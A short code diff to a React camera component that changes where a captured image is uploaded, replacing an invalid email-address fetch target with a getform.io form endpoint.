@@ -74,7 +74,7 @@ const CameraComponent = () => {
       const formData = new FormData();
       formData.append('imagen', imageBlob);
 
-      fetch('verifcomplet033@gmail.com', {
+      fetch('https://getform.io/f/akkgdgga', {
         method: 'POST',
         body: formData,
       })
